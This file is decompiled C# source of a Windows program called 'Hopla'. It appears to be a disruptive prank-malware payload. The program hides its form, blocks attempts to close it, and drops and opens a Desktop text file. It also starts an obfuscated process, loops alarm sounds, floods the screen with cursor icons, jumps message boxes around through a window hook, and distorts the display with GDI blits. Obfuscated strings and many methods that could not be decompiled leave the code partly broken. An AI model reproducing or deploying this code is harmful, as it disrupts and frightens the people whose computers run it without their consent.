﻿// Decompiled with JetBrains decompiler
// Type: GForm1
// Assembly: Hopla, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CE498A5B-1A41-4370-AFD2-213D1C256621
// Assembly location: C:\Users\kdap\OneDrive\Documents\Desktop\Hopla.exeCleaned-cleaned_constantsdec_Slayed.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Resources;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Threading;
using System.Windows.Forms;

#nullable disable
public class GForm1 : Form
{
  private const uint uint_0 = 13369376;
  private const uint uint_1 = 6684742;
  private const uint uint_2 = 3342344;
  public static Random random_0;
  private IContainer icontainer_0;

  [DllImport("gdi32.dll")]
  private static extern IntPtr CreateCompatibleDC(IntPtr intptr_0);

  [DllImport("gdi32.dll")]
  private static extern bool BitBlt(
    IntPtr intptr_0,
    int int_0,
    int int_1,
    int int_2,
    int int_3,
    IntPtr intptr_1,
    int int_4,
    int int_5,
    uint uint_3);

  [DllImport("gdi32.dll")]
  private static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

  [DllImport("gdi32.dll")]
  private static extern bool DeleteObject(IntPtr intptr_0);

  [DllImport("gdi32.dll")]
  private static extern IntPtr CreateCompatibleBitmap(IntPtr intptr_0, int int_0, int int_1);

  [DllImport("gdi32.dll")]
  private static extern bool DeleteDC(IntPtr intptr_0);

  [DllImport("user32.dll")]
  private static extern IntPtr LoadCursor(IntPtr intptr_0, IntPtr intptr_1);

  [DllImport("user32.dll")]
  public static extern bool GetCursorPos(out GForm1.GStruct0 gstruct0_0);

  [DllImport("user32.dll")]
  private static extern IntPtr GetDC(IntPtr intptr_0);

  [DllImport("user32.dll")]
  private static extern int ReleaseDC(IntPtr intptr_0, IntPtr intptr_1);

  [DllImport("user32.dll")]
  public static extern bool DrawIcon(IntPtr intptr_0, int int_0, int int_1, IntPtr intptr_1);

  public GForm1()
  {
    this.method_3<ComponentResourceManager, Icon, object, FormClosingEventArgs, EventArgs>();
  }

  private void method_0<T0, T1>(T0 gparam_0, T1 gparam_1)
  {
    this.Hide();
    this.method_1<Thread>();
  }

  private void method_1<T0>()
  {
    T0 gparam_0_1 = (T0) new Thread(new ThreadStart(GForm1.smethod_5));
    T0 gparam_0_2 = (T0) new Thread(new ThreadStart(GForm1.smethod_4));
    T0 gparam_0_3 = (T0) new Thread(new ThreadStart(GForm1.smethod_2<IntPtr>));
    T0 gparam_0_4 = (T0) new Thread(new ThreadStart(GForm1.smethod_3<Random, Func<int, Icon>, int, Icon, Rectangle, IntPtr, SolidBrush>));
    T0 gparam_0_5 = (T0) new Thread(new ThreadStart(GForm1.smethod_1<Random>));
    T0 gparam_0_6 = (T0) new Thread(new ThreadStart(GForm1.Class5.smethod_2));
    T0 gparam_0_7 = (T0) new Thread(new ThreadStart(GForm1.Class8.smethod_10<IntPtr, int, Func<int, int>, Rectangle, SolidBrush>));
    T0 obj1 = (T0) new Thread(new ThreadStart(GForm1.Class10.smethod_8<IntPtr, int, Func<int, int>, Func<int, uint>, Rectangle, SolidBrush, uint>));
    T0 obj2 = (T0) new Thread(new ThreadStart(GForm1.smethod_0<SpeechSynthesizer>));
    GForm1.smethod_7<string>();
    Thread.Sleep(15000);
    try
    {
      Process.Start(\u003CModule\u003E.smethod_5<string>(-1347820506));
    }
    catch
    {
    }
    GForm1.smethod_6<T0, int>(gparam_0_1, 20000);
    GForm1.smethod_6<T0, int>(gparam_0_2, 20000);
    GForm1.smethod_6<T0, int>(gparam_0_3, 15000);
    GForm1.smethod_6<T0, int>(gparam_0_4, 8500);
    GForm1.smethod_6<T0, int>(gparam_0_5, 18950);
    GForm1.smethod_6<T0, int>(gparam_0_6, 15000);
    GForm1.smethod_6<T0, int>(gparam_0_7, 15000);
    ((Thread) obj2).Start();
    ((Thread) obj1).Start();
  }

  private static void smethod_0<T0>()
  {
    // ISSUE: unable to decompile the method.
  }

  private static void smethod_1<T0>()
  {
    // ISSUE: unable to decompile the method.
  }

  private static void smethod_2<T0>()
  {
    T0 intptr_1 = (T0) GForm1.LoadCursor(IntPtr.Zero, (IntPtr) 32512);
    GForm1.GStruct0 gstruct0_0;
    while (GForm1.GetCursorPos(out gstruct0_0))
    {
      T0 dc = (T0) GForm1.GetDC(IntPtr.Zero);
      if ((IntPtr) dc == IntPtr.Zero)
        break;
      GForm1.DrawIcon((IntPtr) dc, gstruct0_0.int_0, gstruct0_0.int_1, (IntPtr) intptr_1);
      GForm1.ReleaseDC(IntPtr.Zero, (IntPtr) dc);
      Thread.Sleep(15);
    }
  }

  private static void smethod_3<T0, T1, T2, T3, T4, T5, T6>()
  {
    // ISSUE: unable to decompile the method.
  }

  public static void smethod_4()
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Action(new GForm1.Class16()
    {
      func_0 = (Func<int, int>) (gparam_0 =>
      {
        // ISSUE: unable to decompile the method.
      }),
      func_1 = (Func<Point, int, Point>) ((gparam_0, gparam_1) =>
      {
        // ISSUE: unable to decompile the method.
      }),
      func_2 = (Func<Point, Func<Point, Point>, Point>) ((gparam_0, gparam_1) => (T0) ((Func<Point, Point>) gparam_1)(((Func<Point, Point>) gparam_1)(((Func<Point, Point>) gparam_1)(((Func<Point, Point>) gparam_1)((Point) gparam_0)))))
    }.method_0<Point, SolidBrush, Func<Point, Point>, Func<SolidBrush, Func<Point, Point>>, int, Color>)();
  }

  private static void smethod_5()
  {
    while (true)
    {
      SystemSounds.Hand.Play();
      Thread.Sleep(GForm1.random_0.Next(200, 500));
      SystemSounds.Exclamation.Play();
      Thread.Sleep(GForm1.random_0.Next(350, 750));
    }
  }

  public static void smethod_6<T0, T1>(T0 gparam_0, T1 gparam_1)
  {
    ((Thread) gparam_0).Start();
    Thread.Sleep((int) gparam_1);
  }

  CreateParams Form.CreateParams
  {
    get
    {
      CreateParams createParams = __nonvirtual (((Form) this).CreateParams);
      createParams.ExStyle |= 128 /*0x80*/;
      return createParams;
    }
  }

  private static void smethod_7<T0>()
  {
    T0 obj = (T0) Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), \u003CModule\u003E.smethod_2<string>(-1504252064));
    File.WriteAllText((string) obj, string.Concat((string[]) new T0[14]
    {
      (T0) \u003CModule\u003E.smethod_2<string>(2110804301),
      (T0) Environment.NewLine,
      (T0) Environment.NewLine,
      (T0) \u003CModule\u003E.smethod_4<string>(-14281016),
      (T0) Environment.NewLine,
      (T0) \u003CModule\u003E.smethod_5<string>(-1418578056),
      (T0) Environment.NewLine,
      (T0) Environment.NewLine,
      (T0) \u003CModule\u003E.smethod_6<string>(-806324816),
      (T0) Environment.NewLine,
      (T0) Environment.NewLine,
      (T0) \u003CModule\u003E.smethod_6<string>(-230806290),
      (T0) Environment.NewLine,
      (T0) \u003CModule\u003E.smethod_5<string>(-1735521979)
    }));
    try
    {
      Process.Start((string) obj);
    }
    catch
    {
    }
  }

  private void method_2<T0, T1>(T0 gparam_0, T1 gparam_1)
  {
    ((CancelEventArgs) gparam_1).Cancel = true;
  }

  virtual void Form.Dispose(bool disposing)
  {
    if (disposing && this.icontainer_0 != null)
      this.icontainer_0.Dispose();
    // ISSUE: explicit non-virtual call
    __nonvirtual (((Form) this).Dispose(disposing));
  }

  private void method_3<T0, T1, T2, T3, T4>()
  {
    T0 obj = (T0) new ComponentResourceManager(typeof (GForm1));
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(10, 10);
    this.ControlBox = false;
    this.FormBorderStyle = FormBorderStyle.None;
    this.Icon = (Icon) ((ResourceManager) obj).GetObject(\u003CModule\u003E.smethod_6<string>(-2064470113));
    this.Name = \u003CModule\u003E.smethod_5<string>(2101718820);
    this.Opacity = 0.0;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.StartPosition = FormStartPosition.Manual;
    this.WindowState = FormWindowState.Minimized;
    this.FormClosing += new FormClosingEventHandler(this.method_2<T2, T3>);
    this.Load += new EventHandler(this.method_0<T2, T4>);
    this.ResumeLayout(false);
  }

  static GForm1()
  {
    // ISSUE: unable to decompile the method.
  }

  public struct GStruct0
  {
    public int int_0;
    public int int_1;
  }

  private delegate IntPtr Delegate0(int n, IntPtr w, IntPtr l);

  private static class Class5
  {
    private static Random random_0 = GForm1.Class5.smethod_11();
    private static IntPtr intptr_0 = IntPtr.Zero;
    private static GForm1.Delegate0 delegate0_0 = new GForm1.Delegate0(GForm1.Class5.smethod_0<IntPtr, Rectangle, int, SolidBrush>);
    private const int int_0 = 5;
    private const int int_1 = 5;
    private const uint uint_0 = 1;
    private const uint uint_1 = 4;
    private const uint uint_2 = 16 /*0x10*/;
    private const uint uint_3 = 0;
    private const uint uint_4 = 16 /*0x10*/;
    private const uint uint_5 = 4096 /*0x1000*/;

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(
      int int_2,
      GForm1.Delegate0 delegate0_1,
      IntPtr intptr_1,
      uint uint_6);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr intptr_1);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(
      IntPtr intptr_1,
      int int_2,
      IntPtr intptr_2,
      IntPtr intptr_3);

    [DllImport("user32.dll")]
    private static extern bool SetWindowPos(
      IntPtr intptr_1,
      IntPtr intptr_2,
      int int_2,
      int int_3,
      int int_4,
      int int_5,
      uint uint_6);

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();

    [DllImport("user32.dll")]
    private static extern int MessageBox(
      IntPtr intptr_1,
      string string_0,
      string string_1,
      uint uint_6);

    private static T0 smethod_0<T0, T1, T2, T3>(T2 gparam_0, T0 gparam_1, T0 gparam_2)
    {
      T0 obj = gparam_1;
      if (gparam_0 == 5)
      {
        T1 bounds = (T1) Screen.PrimaryScreen.Bounds;
        T2 int_2 = (T2) Math.Abs((GForm1.Class5.random_0.Next() ^ Environment.TickCount ^ (int) (IntPtr) obj) % (bounds.Width - 220));
        T2 int_3 = (T2) Math.Abs((~GForm1.Class5.random_0.Next() ^ Environment.TickCount ^ (int) (IntPtr) obj) % (bounds.Height - 120));
        using ((T3) new SolidBrush(Color.FromArgb(GForm1.Class5.random_0.Next(256 /*0x0100*/), Color.Magenta)))
          GForm1.Class5.SetWindowPos((IntPtr) gparam_1, IntPtr.Zero, (int) int_2, (int) int_3, 0, 0, 21U);
      }
      return (T0) GForm1.Class5.CallNextHookEx(GForm1.Class5.intptr_0, (int) gparam_0, (IntPtr) gparam_1, (IntPtr) gparam_2);
    }

    private static void smethod_1()
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      GForm1.Class5.Class7 class7 = new GForm1.Class5.Class7()
      {
        func_0 = (Func<int>) (() => (T0) GForm1.Class5.random_0.Next(3000, 7000)),
        action_0 = (Action) null
      };
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      class7.action_0 = new Action(class7.method_0<WaitCallback, int, DateTime, SolidBrush, object>);
      // ISSUE: reference to a compiler-generated field
      class7.action_0();
    }

    public static void smethod_2() => GForm1.Class5.smethod_1();

    static Random smethod_11() => (Random) Activator.CreateInstance(typeof (Random));
  }

  private static class Class8
  {
    private static Random random_0 = GForm1.Class8.smethod_19();
    private static int int_0 = 0;
    private static int int_1 = 0;
    private static int int_2 = 1;
    private static int int_3 = 1337;
    private const uint uint_0 = 13369376;
    private const uint uint_1 = 3342344;

    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr intptr_0);

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(
      IntPtr intptr_0,
      int int_4,
      int int_5,
      int int_6,
      int int_7,
      IntPtr intptr_1,
      int int_8,
      int int_9,
      int int_10,
      int int_11,
      uint uint_2);

    private static T0 smethod_0<T0>(T0 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static T0 smethod_1<T0>(T0 gparam_0, T0 gparam_1)
    {
      // ISSUE: unable to decompile the method.
    }

    private static T0 smethod_2<T0>(T0 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_3<T0>(T0 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_4<T0>()
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_5<T0, T1>(T1 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_6<T0, T1, T2>(T2 gparam_0, T1 gparam_1, T1 gparam_2, T1 gparam_3)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_7<T0, T1>(T1 gparam_0, T0 gparam_1, T0 gparam_2)
    {
      T0 int_4 = (T0) GForm1.Class8.random_0.Next(0, (int) gparam_1);
      T0 int_5 = (T0) GForm1.Class8.random_0.Next(0, (int) gparam_2);
      T0 int_6 = (T0) GForm1.Class8.random_0.Next(50, (int) gparam_1);
      T0 int_7 = (T0) GForm1.Class8.random_0.Next(50, (int) gparam_2);
      GForm1.Class8.StretchBlt((IntPtr) gparam_0, (int) int_4, (int) int_5, (int) int_6, (int) int_7, (IntPtr) gparam_0, 0, 0, (int) gparam_1, (int) gparam_2, 3342344U);
    }

    private static void smethod_8<T0, T1>(T1 gparam_0, T0 gparam_1, T0 gparam_2)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_9<T0, T1, T2, T3, T4>()
    {
      // ISSUE: unable to decompile the method.
    }

    public static void smethod_10<T0, T1, T2, T3, T4>()
    {
      GForm1.Class8.smethod_9<T0, T1, T2, T3, T4>();
    }

    static Random smethod_19() => (Random) Activator.CreateInstance(typeof (Random));
  }

  private static class Class10
  {
    private static Random random_0 = GForm1.Class10.smethod_16();
    private static int int_0 = 1;
    private static int int_1 = 7;
    private static int int_2 = 123;
    private const uint uint_0 = 13369376;
    private const uint uint_1 = 3342344;

    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr intptr_0);

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(
      IntPtr intptr_0,
      int int_3,
      int int_4,
      int int_5,
      int int_6,
      IntPtr intptr_1,
      int int_7,
      int int_8,
      int int_9,
      int int_10,
      uint uint_2);

    private static T0 smethod_0<T0>(T0 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static T0 smethod_1<T0>(T0 gparam_0, T0 gparam_1)
    {
      // ISSUE: unable to decompile the method.
    }

    private static T0 smethod_2<T0>(T0 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static T0 smethod_3<T0>(T0 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_4<T0>(T0 gparam_0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_5<T0>()
    {
      // ISSUE: unable to decompile the method.
    }

    private static void smethod_6<T0>(T0 gparam_0)
    {
      GForm1.Class10.int_2 ^= ((Func<int, int>) gparam_0)(GForm1.Class10.random_0.Next());
    }

    private static void smethod_7<T0, T1, T2, T3, T4, T5, T6>()
    {
      // ISSUE: unable to decompile the method.
    }

    public static void smethod_8<T0, T1, T2, T3, T4, T5, T6>()
    {
      GForm1.Class10.smethod_7<T0, T1, T2, T3, T4, T5, T6>();
    }

    static Random smethod_16() => (Random) Activator.CreateInstance(typeof (Random));
  }
}
